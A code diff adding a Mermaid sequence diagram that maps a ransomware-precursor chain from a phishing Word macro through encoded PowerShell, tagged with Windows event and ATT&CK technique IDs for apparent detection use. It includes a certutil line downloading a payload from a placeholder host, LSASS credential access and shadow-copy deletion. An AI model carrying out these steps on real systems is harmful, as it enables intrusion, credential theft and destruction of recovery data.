@@ -1,0 +1,17 @@
+sequenceDiagram
+    participant User
+    participant WINWORD as WINWORD.EXE
+    participant PS as powershell.exe
+    participant LOLBin as certutil.exe
+    participant Task as Task Scheduler
+    participant LSASS as lsass.exe
+    participant Shares as SMB shares / VSS
+
+    User->>WINWORD: Opens phishing attachment, enables macro content
+    WINWORD->>PS: Spawns powershell.exe -EncodedCommand <base64>
+    PS->>LOLBin: certutil.exe -urlcache -f http://stage/x -> stage2.dll
+    LOLBin->>PS: Downloaded payload loaded back into PowerShell
+    PS->>Task: schtasks /create - persistence (Event ID 4698)
+    PS->>LSASS: Opens handle to lsass.exe for credential access (T1003.001)
+    PS->>Shares: Enumerates SMB shares, deletes shadow copies (T1490)
+    Note over PS,Shares: Ransomware precursor pattern -\n discovery + backup/recovery tampering\nbefore any encryption activity
